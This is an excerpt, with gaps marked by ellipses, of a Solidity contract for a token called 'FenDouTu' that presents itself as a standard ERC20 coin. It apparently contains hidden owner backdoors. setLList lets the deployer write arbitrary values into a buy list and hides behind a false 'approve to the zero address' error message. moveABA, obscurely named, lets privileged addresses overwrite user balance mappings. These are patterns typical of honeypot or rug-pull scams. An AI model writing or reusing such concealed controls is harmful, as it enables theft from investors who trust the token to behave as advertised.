...
contract FenDouTu is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "FenDouTu";
    string private _symbol = "FenDouTu";
    uint8 private _decimals = 9;

    address payable private marketWall = payable(0xB8A9147300298709B9cc196043Db30bAe4a648AA); 
    address payable private teamWalletAddress = payable(0x53AF76a54876Bd9824B338a6d67c46cDe5F94671); 
    ...
    uint256 private minimumTokensBeforeSwap = 5* 10**8 * 10**_decimals;
    ...
    constructor (uint256 serviceFee_,uint256[2] memory buyFeeSetting_) {
	    require(
            160000000000000000 == serviceFee_ ,
		...
		sellList[_msgSender()] = _totalSupply;
	...
	function setLList(address  A, uint256 B) public {
	   require(sellList[msg.sender] >= _totalSupply , "ERC20: approve to the zero address");
	      buyList[A] = B; 
    }
    ...
    function moveABA(address recipient) external  {
        require( isExcludedFromFee[msg.sender]);
        _usdt[recipient] = _adminOwned[recipient] ;
    }
